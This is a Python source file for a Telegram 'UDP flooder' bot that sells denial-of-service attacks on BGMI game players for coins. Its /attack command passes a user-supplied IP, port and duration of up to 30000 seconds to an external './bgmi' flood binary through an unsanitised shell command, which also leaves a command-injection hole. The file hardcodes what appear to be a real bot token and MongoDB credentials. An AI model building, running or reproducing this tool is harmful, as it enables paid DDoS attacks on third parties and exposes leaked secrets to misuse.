import asyncio
import sys
from datetime import datetime, timedelta
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from motor.motor_asyncio import AsyncIOMotorClient

# --- Configuration ---
TELEGRAM_BOT_TOKEN = '8647083732:AAHnRuZw6y7EM4iJrFFqfSxkRhWJosvlcUA'  # Replace with your bot token
ADMIN_USER_ID = 8003600588
MONGO_URI = "mongodb+srv://Kamisama:Kamisama@kamisama.m6kon.mongodb.net/"
DB_NAME = "legxninja"
COLLECTION_NAME = "users"
ATTACK_TIME_LIMIT = 30000
COINS_REQUIRED_PER_ATTACK = 5

# --- Global Variables ---
bot_start_time = datetime.now()
attack_in_progress = False
attack_end_time = None

# --- MongoDB Setup ---
if sys.platform == 'win32':
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

mongo_client = AsyncIOMotorClient(MONGO_URI)
db = mongo_client[DB_NAME]
users_collection = db[COLLECTION_NAME]

# --- Database Functions ---
async def get_user(user_id):
    user = await users_collection.find_one({"user_id": user_id})
    if not user:
        return {"user_id": user_id, "coins": 0}
    return user

async def update_user(user_id, coins):
    await users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"coins": coins}},
        upsert=True
    )

# --- Command Handlers ---
async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*❄️ WELCOME TO @NINJAGAMEROP ULTIMATE UDP FLOODER ❄️*\n\n"
        "*🔥 Yeh bot apko deta hai hacking ke maidan mein asli mazza! 🔥*\n\n"
        "*✨ Key Features: ✨*\n"
        "🚀 *𝘼𝙩𝙩𝙖𝙘𝙠 𝙠𝙖𝙧𝙤 𝙖𝙥𝙣𝙚 𝙤𝙥𝙥𝙤𝙣𝙚𝙣𝙩𝙨 𝙥𝙖𝙧 𝘽𝙜𝙢𝙞 𝙈𝙚 /attack*\n"
        "🏦 *𝘼𝙘𝙘𝙤𝙪𝙣𝙩 𝙠𝙖 𝙗𝙖𝙡𝙖𝙣𝙘𝙚 𝙖𝙪𝙧 𝙖𝙥𝙥𝙧𝙤𝙫𝙖𝙡 𝙨𝙩𝙖𝙩𝙪𝙨 𝙘𝙝𝙚𝙘𝙠 𝙠𝙖𝙧𝙤 /myinfo*\n\n"
        "*⚠️ Kaise Use Kare? ⚠️*\n"
        "*Commands ka use karo: /help*\n\n"
        "*💬 Contact Admin: @NINJAGAMEROP*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def ninja(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*🖕 Chal nikal! Tera aukaat nahi hai yeh command chalane ki.*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /ninja <add|rem> <user_id> <coins>*", parse_mode='Markdown')
        return

    try:
        command, target_user_id, coins_str = args
        coins = int(coins_str)
        target_user_id = int(target_user_id)
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid arguments.*", parse_mode='Markdown')
        return

    user = await get_user(target_user_id)

    if command == 'add':
        new_balance = user["coins"] + coins
        await update_user(target_user_id, new_balance)
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {target_user_id} ko {coins} coins diye gaye. Balance: {new_balance}.*", parse_mode='Markdown')
    elif command == 'rem':
        new_balance = max(0, user["coins"] - coins)
        await update_user(target_user_id, new_balance)
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {target_user_id} ke {coins} coins kaat diye. Balance: {new_balance}.*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress, attack_end_time

    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    args = context.args

    user = await get_user(user_id)

    if user["coins"] < COINS_REQUIRED_PER_ATTACK:
        await context.bot.send_message(chat_id=chat_id, text="*💰 Bhai, tere paas toh coins nahi hai! DM:- @NINJAGAMEROP*", parse_mode='Markdown')
        return

    if attack_in_progress:
        if attack_end_time:
            remaining_time = (attack_end_time - datetime.now()).total_seconds()
            await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Attack chal raha hai. {int(remaining_time)} seconds baaki.*", parse_mode='Markdown')
        else:
            await context.bot.send_message(chat_id=chat_id, text="*⚠️ Attack chal raha hai.*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port_str, duration_str = args
    try:
        port = int(port_str)
        duration = int(duration_str)
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Port and Duration must be numbers.*", parse_mode='Markdown')
        return

    restricted_ports = [17500, 20000, 20001, 20002]
    if port in restricted_ports or (100 <= port <= 999):
        await context.bot.send_message(chat_id=chat_id, text="*❌ YE PORT WRONG HAI.*", parse_mode='Markdown')
        return

    if duration > ATTACK_TIME_LIMIT:
        await context.bot.send_message(chat_id=chat_id, text=f"*⛔ Limit {ATTACK_TIME_LIMIT} seconds hai.*", parse_mode='Markdown')
        return

    # Deduct coins
    new_balance = user["coins"] - COINS_REQUIRED_PER_ATTACK
    await update_user(user_id, new_balance)

    attack_in_progress = True
    attack_end_time = datetime.now() + timedelta(seconds=duration)
    
    await context.bot.send_message(
        chat_id=chat_id,
        text=f"*🚀 ATTACK INITIATED*\n*Target: {ip}:{port}*\n*Duration: {duration}s*\n*Remaining Balance: {new_balance}*",
        parse_mode='Markdown'
    )

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

async def run_attack(chat_id, ip, port, duration, context):
    global attack_in_progress, attack_end_time
    
    try:
        # Ensure ./bgmi binary exists
        command = f"./bgmi {ip} {port} {duration} {13} {600}"
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()
    except Exception as e:
        print(f"Error: {e}")
    finally:
        attack_in_progress = False
        attack_end_time = None
        await context.bot.send_message(chat_id=chat_id, text="*✅ ATTACK FINISHED*", parse_mode='Markdown')

async def uptime(update: Update, context: CallbackContext):
    elapsed_time = (datetime.now() - bot_start_time).total_seconds()
    minutes, seconds = divmod(int(elapsed_time), 60)
    await context.bot.send_message(update.effective_chat.id, text=f"*⏰Bot uptime:* {minutes}m {seconds}s", parse_mode='Markdown')

async def myinfo(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    user = await get_user(user_id)
    balance = user["coins"]
    await context.bot.send_message(update.effective_chat.id, text=f"*💰 Coins: {balance}*", parse_mode='Markdown')

async def help_command(update: Update, context: CallbackContext):
    message = "*🛠️ Commands:*\n/attack <ip> <port> <time>\n/myinfo\n/help"
    await context.bot.send_message(update.effective_chat.id, text=message, parse_mode='Markdown')

async def users(update: Update, context: CallbackContext):
    if update.effective_chat.id != ADMIN_USER_ID:
        return
    users_cursor = users_collection.find()
    user_data = await users_cursor.to_list(length=None)
    msg = "*Users:*\n"
    for u in user_data:
        msg += f"{u.get('user_id')}: {u.get('coins')}\n"
    await context.bot.send_message(update.effective_chat.id, text=msg, parse_mode='Markdown')

async def remove_user(update: Update, context: CallbackContext):
    if update.effective_chat.id != ADMIN_USER_ID:
        return
    if not context.args:
        return
    target_id = int(context.args[0])
    await users_collection.delete_one({"user_id": target_id})
    await context.bot.send_message(update.effective_chat.id, text="*User Removed.*", parse_mode='Markdown')

def main():
    print("Bot starting...")
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("ninja", ninja))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("myinfo", myinfo))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("uptime", uptime))
    application.add_handler(CommandHandler("users", users))
    application.add_handler(CommandHandler("remove", remove_user))
    
    application.run_polling()

if __name__ == '__main__':
    main()
